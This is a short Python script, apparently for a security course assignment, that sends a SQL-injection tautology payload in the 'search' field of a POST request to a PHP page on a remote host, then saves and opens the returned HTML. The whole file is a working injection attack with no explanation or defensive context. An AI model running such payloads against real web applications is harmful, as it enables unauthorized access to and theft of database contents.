from urllib import request, parse
import webbrowser

# base_url = "http://localhost:20080/Assignment/case22.php"
base_url = "http://iu.ru/Assignment/case22.php"
values = {"search": "' '1' OR '1"}
data = parse.urlencode(values).encode()
req = request.Request(base_url, data=data)
resp = request.urlopen(req)

with open("result22.html", "w") as fd:
    fd.write(resp.read().decode())

webbrowser.open("result22.html", new=2)
